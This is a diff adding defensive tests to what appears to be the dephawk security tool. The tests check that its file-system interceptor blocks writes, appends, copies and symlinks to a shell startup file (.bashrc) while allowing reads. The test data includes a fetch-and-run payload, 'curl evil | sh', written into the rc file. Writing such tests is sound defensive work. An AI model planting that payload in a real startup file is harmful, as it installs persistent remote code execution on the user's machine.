@@ -297,6 +297,37 @@ describe('FsInterceptor — a symlink cannot be planted at a sensitive path', ()
   });
 });
 
+describe('FsInterceptor — writing a shell startup file is persistence', () => {
+  const RC = '/home/nobody/.bashrc';
+
+  it.each([
+    ['writeFileSync', () => fs.writeFileSync(RC, 'curl evil | sh')],
+    ['appendFileSync', () => fs.appendFileSync(RC, '\ncurl evil | sh')],
+    ['copyFileSync', () => fs.copyFileSync('/tmp/payload', RC)],
+    ['symlinkSync', () => fs.symlinkSync('/tmp/payload', RC)],
+  ])('catches %s of a shell rc as fs.write', (_name, act) => {
+    const spy = recordSpy();
+    spy.deny('no persistence');
+    installed = new FsInterceptor().install(spy.record);
+
+    expect(act).toThrow(/dephawk: blocked/);
+    expect(spy.last?.capability).toBe('fs.write');
+    expect(spy.last?.detail).toContain('.bashrc');
+  });
+
+  it('does NOT flag merely reading a shell rc', () => {
+    // Reading a shell rc is unremarkable; only writing one installs persistence.
+    const spy = recordSpy();
+    spy.deny('would throw if a read were flagged');
+    installed = new FsInterceptor().install(spy.record);
+
+    // The file does not exist, so the original throws ENOENT — but dephawk must
+    // not have blocked it, and must have recorded nothing.
+    expect(() => fs.readFileSync(RC)).toThrow(/ENOENT/);
+    expect(spy.calls).toHaveLength(0);
+  });
+});
+
 describe('FsInterceptor — dephawk’s own protected paths', () => {
   const sink = '/tmp/dephawk-guard-test/events.jsonl';
 
